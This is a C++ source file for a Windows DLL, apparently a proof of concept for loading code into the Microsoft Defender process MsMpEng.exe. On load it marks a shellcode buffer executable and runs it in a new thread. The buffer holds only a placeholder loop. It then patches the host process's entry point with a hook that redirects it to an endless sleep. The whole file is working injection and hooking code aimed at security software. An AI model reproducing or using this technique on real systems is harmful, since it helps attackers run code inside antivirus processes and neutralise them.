#include "pch.h"
#include <Windows.h>

unsigned char shellcode[] = { 0xeb, 0xfe };
BYTE hook[] = { 0x48, 0xb8, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0xff, 0xe0 };

typedef void (*run)(void);

DWORD threadStart(LPVOID) {
    run runner = (run)&shellcode;

    runner();

    return 1;
}

void sleepForever() {
    while (true) {
        Sleep(60000);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {

    HANDLE event;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS32 ntHeader;
    PBYTE entryPoint;
    PBYTE baseAddress;
    DWORD oldProt;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        event = CreateEvent(NULL, TRUE, FALSE, TEXT("wibbleevent"));

        // Tell our loader that we have started so that it can remove the symbolic link
        SetEvent(event);

        MessageBoxA(NULL, "DLL LOADED", "LOADED DLL", MB_OK);

        // Kick off our shellcode thread
        VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProt);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)threadStart, NULL, 0, NULL);

        // Get the base address of the hosting application
        baseAddress = (PBYTE)GetModuleHandleA("MsMpEng.exe");

        // Find the start address from the PE headers
        dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
        ntHeader = (PIMAGE_NT_HEADERS32)(baseAddress + dosHeader->e_lfanew);
        entryPoint = baseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint;

        // Copy over the hook
        VirtualProtect(entryPoint, sizeof(hook), PAGE_READWRITE, &oldProt);
        memcpy(entryPoint, hook, sizeof(hook));
        *(ULONG64*)((PBYTE)entryPoint + 2) = (ULONG64)sleepForever;
        VirtualProtect(entryPoint, sizeof(hook), oldProt, &oldProt);

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

